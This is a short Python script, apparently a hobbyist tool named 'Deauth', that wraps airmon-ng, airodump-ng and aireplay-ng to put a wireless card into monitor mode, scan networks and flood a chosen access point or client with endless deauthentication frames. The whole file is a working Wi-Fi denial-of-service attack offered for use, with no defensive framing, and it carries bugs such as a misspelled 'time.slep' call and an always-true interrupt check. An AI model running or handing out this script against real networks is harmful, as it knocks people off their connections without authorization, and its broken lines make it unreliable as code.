import os
import subprocess
import time
print(r"""
________                        __   __
\______ \   ____ _____   __ ___/  |_|  |__
 |    |  \_/ __ \\__  \ |  |  \   __\  |  \
 |    `   \  ___/ / __ \|  |  /|  | |   Y  \
/_______  /\___  >____  /____/ |__| |___|  /
        \/     \/     \/                 \/
""")
if not 'SUDO_UID' in os.environ.keys():
    print("Run it as root")
    exit()
print("""Requirements:
You will need a wifi adapter for monitor mode and packet injection!
You will need to install these packages:
        Airmon-ng
        Airoudump-ng
        Aireplay-ng
""")
print("Killing processes that can cause problems")
time.sleep(1)
subprocess.run(["sudo" , "airmon-ng" , "check" , "kill"])
time.sleep(1)
print("Putting interface into monitor mode:'")
subprocess.run(["sudo" , "airmon-ng" , "start" , "wlan0"])
time.sleep(1)
print("Discoverging networks:")
time.sleep(2)
try:
    subprocess.run(["sudo" , "airodump-ng" , "wlan0"])
except KeyboardInterrupt:
    client_or_not = input("Enter 'y' if you want to attack just specific client(s) , type 'n' if you want to attack all the clients in a netwrok: ")
if client_or_not == "y":
    bssid = input("Enter the netwrok's bssid to attack: ")
    time.sleep(1.5)
    print("Running airodump-ng")
    print("Press Ctrl+C to stop discovering netwroks!")
    time.sleep(1)
    try:
        subprocess.run(["sudo" , "airodump-ng" , "-d" , bssid , "wlan0" ])
    except KeyboardInterrupt:
        mac_address = input("Enter the client(s) mac address to continue: ")
        time.sleep(0.5)
        print("Sending Deauth frames to the target!")
        subprocess.run(["sudo" , "aireplay-ng" , "--deauth" , "0" , "-a" , bssid , "-c" , mac_address , "-D" , "wlan0" ])
elif client_or_not == "n":
    network_bssid = input("Enter the network's bssid to attack: ")
    time.sleep(1.5)
    print("Sending Deauth frames: ")
    time.sleep(1)
    subprocess.run(["sudo" , "aireplay-ng" , "--deauth" , "0" , "-a" , network_bssid , "-D" , "wlan0"])
    if KeyboardInterrupt:
        print("KeyboardInterrupt")
        time.slep(1.5)
        print("Exiting")
        time.sleep(1)
        exit()
else:
    print("Invalid option(s)")
    time.sleep(1)
    print("Exiting")
    time.sleep(0.5)
    exit()
